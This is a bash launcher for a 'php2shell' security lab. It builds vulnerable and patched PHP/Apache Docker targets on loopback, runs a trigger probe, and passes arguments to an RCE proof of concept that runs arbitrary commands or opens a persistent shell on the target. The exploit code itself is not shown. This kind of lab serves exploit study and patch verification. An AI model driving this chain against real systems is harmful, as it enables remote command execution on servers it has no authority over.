#!/usr/bin/env bash
# php2shell lab: one-command demonstration.
#
#   ./run.sh                                  # vulnerable: probe + proof of id
#   ./run.sh --cmd "uname -a"                 # run any command through the chain
#   ./run.sh --shell                          # persistent shell on the target
#   ./run.sh --shell --shell-cmd "id"         # run commands in that shell
#   ./run.sh patched                          # fixed image: expect no shell
#
# Builds and starts the target on loopback, runs the probe, then passes every
# remaining argument straight to poc/rce.py. Nothing is exposed beyond
# 127.0.0.1.
#
# Note: build once, then start. Rebuilding while a container is running
# replaces the image layer under it and can leave the container in a state the
# chain was not calibrated for.
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

MODE="vulnerable"
if [ "${1:-}" = "vulnerable" ] || [ "${1:-}" = "patched" ]; then
  MODE="$1"
  shift
fi

case "$MODE" in
  vulnerable)
    SERVICE="vulnerable"; CONTAINER="php2shell-vulnerable"; PORT="18080" ;;
  patched)
    SERVICE="patched";    CONTAINER="php2shell-patched";    PORT="18081" ;;
  *)
    echo "usage: $0 [vulnerable|patched] [rce.py options...]" >&2
    exit 2 ;;
esac

echo "== building and starting the ${MODE} lab target =="
if [ "$MODE" = "patched" ]; then
  docker compose --profile patched up -d --build "$SERVICE"
else
  docker compose up -d --build "$SERVICE"
fi

echo "== waiting for http://127.0.0.1:${PORT}/ =="
for _ in $(seq 1 60); do
  if curl -fsS -o /dev/null "http://127.0.0.1:${PORT}/"; then break; fi
  sleep 0.5
done
curl -s "http://127.0.0.1:${PORT}/" || true

# Skip the probe when the caller is asking for something specific; it is only
# noise in front of a shell session.
if [ "$#" -eq 0 ]; then
  echo
  echo "== trigger probe: does the parser abort before the script runs? =="
  python3 "${HERE}/probe.py" --target "http://127.0.0.1:${PORT}/" || true
fi

echo
echo "== chain (${*:-proof}) =="
CONTAINER="$CONTAINER" PORT="$PORT" python3 "${HERE}/rce.py" "$@" || true

echo
echo "== target container state =="
docker exec "$CONTAINER" sh -c '
  echo "hostname: $(cat /etc/hostname)"
  n=$(pgrep -P 1 -f apache2 | wc -l)
  echo "workers:  $n (0 means the exploited worker aborted, as expected)"
  echo "proof:"
  cat /out/o 2>/dev/null || echo "  (none)"
' || true
